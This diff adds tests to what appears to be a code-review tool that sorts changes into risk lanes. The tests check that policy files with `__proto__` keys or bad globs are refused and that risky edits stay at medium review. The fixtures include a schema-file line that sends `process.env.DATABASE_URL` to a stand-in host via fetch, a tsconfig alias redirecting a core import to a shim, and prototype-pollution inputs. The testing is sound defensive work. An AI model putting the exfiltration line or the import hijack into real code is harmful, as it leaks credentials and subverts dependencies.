@@ -131,6 +131,18 @@ export default review({
     expect(unreadable(policySource("{ merge: { low: 'auto' } }"))).toContain('merge.low')
   })
 
+  test('should refuse a __proto__ key, which sets a prototype no key check sees', () => {
+    expect(unreadable(policySource("{ facts: { __proto__: { 'gate-input': 'low' } } }"))).toContain('has a `__proto__` key')
+    expect(unreadable(policySource("{ paths: { '__proto__': { high: 42 } } }"))).toContain('has a `__proto__` key')
+  })
+
+  test('should refuse a glob outside the * and ** it matches with', () => {
+    for (const glob of ['app/Billing/', './app/Billing/**', '/app/Billing/**', 'app/{Billing,Payments}/**', 'app/Billi?/**', 'app/[A-Z]*']) {
+      expect(unreadable(policySource(`{ paths: { high: [${JSON.stringify(glob)}] } }`))).toContain(`paths.high has ${JSON.stringify(glob)}`)
+    }
+    expect(unreadable(policySource('{ review: { reviewer: "bugbot", timeoutMinutes: 1e400 } }'))).toContain('review.timeoutMinutes')
+  })
+
   test('should refuse lowering a fact below the lane a declaration gives it', () => {
     expect(unreadable(policySource("{ facts: { 'gate-input': 'medium' } }"))).toContain('lowers an always-high fact')
     expect(unreadable(policySource("{ facts: { 'source-edited': 'low' } }"))).toContain('stays medium whatever a plan or the policy says')
@@ -172,6 +184,12 @@ describe('applyReviewPolicy', () => {
       ['review-path', 'medium', 'config/**', ['config/app.ts']],
     ])
   })
+
+  test('should read a glob with no wildcard as a file or a directory, as CODEOWNERS does', () => {
+    const facts = applyReviewPolicy([], [path('app/Billing/Invoice.ts'), path('app/BillingReport.ts')], { paths: { high: 'app/Billing' } })
+
+    expect(facts.map(({ files }) => files)).toEqual([['app/Billing/Invoice.ts']])
+  })
 })
 
 describe('judgeChangeLane with guren.review.ts', () => {
@@ -204,6 +222,41 @@ describe('judgeChangeLane with guren.review.ts', () => {
     expect(report.floor).toBe('high')
     expect(report.facts.map(({ code, lane }) => [code, lane])).toEqual([['file-added', 'medium']])
     expect(report.unjudged).toContainEqual(expect.objectContaining({ reader: 'review-policy', lane: 'high', files: ['guren.review.ts'] }))
+  })
+})
+
+describe('judgeChangeLane: what a lowering may not reach', () => {
+  const lowering = policySource("{ facts: { 'file-added': 'low', 'schema-changed': 'low', 'policy-added': 'low' } }")
+
+  test('should apply nothing from a policy that hides a key in its prototype', async () => {
+    const report = await laneWithPolicy(policySource("{ facts: { __proto__: { 'source-edited': 'low' } } }"), { 'config/app.ts': 'export default { debug: true }\n' })
+
+    expect(report.policy.state).toBe('unreadable')
+    expect(report.facts.map(({ code, lane }) => [code, lane])).toEqual([['source-edited', 'medium']])
+  })
+
+  test('should keep an added file that is not source at medium', async () => {
+    const report = await laneWithPolicy(lowering, { 'app/Http/tsconfig.json': '{ "compilerOptions": { "paths": { "@guren/core": ["./shim.ts"] } } }\n', 'app/Http/Shim.ts': 'export {}\n' })
+
+    expect(report.facts.map(({ code, lane, files }) => [code, lane, files[0]])).toEqual([
+      ['file-added', 'low', 'app/Http/Shim.ts'],
+      ['non-source-added', 'medium', 'app/Http/tsconfig.json'],
+    ])
+  })
+
+  test('should keep code beside the tables of a schema edit at medium', async () => {
+    const tables = `${PG_SCHEMA_FIXTURE}\nexport const tags = pgTable('tags', { id: serial('id').primaryKey() })\n`
+    const onlyTables = await laneWithPolicy(lowering, { 'db/schema.ts': tables.replace('pgTable, serial', 'pgTable, integer, serial') })
+    const beside = await laneWithPolicy(lowering, { 'db/schema.ts': `${tables}await fetch('https://example.invalid/' + process.env.DATABASE_URL)\n` })
+
+    expect(onlyTables.facts.map(({ code, lane }) => [code, lane])).toEqual([['schema-changed', 'low']])
+    expect(beside.facts.map(({ code, lane }) => [code, lane])).toEqual([['schema-changed', 'low'], ['source-edited', 'medium']])
+  })
+
+  test('should not call existing source moved into app/Policies a policy the change added', async () => {
+    const report = await laneWithPolicy(lowering, { 'app/Http/Controllers/PostController.ts': null, 'app/Policies/PostController.ts': 'export class PostController {}\n' })
+
+    expect(report.facts.map(({ code, lane }) => [code, lane])).toEqual([['source-renamed', 'medium']])
   })
 })
 
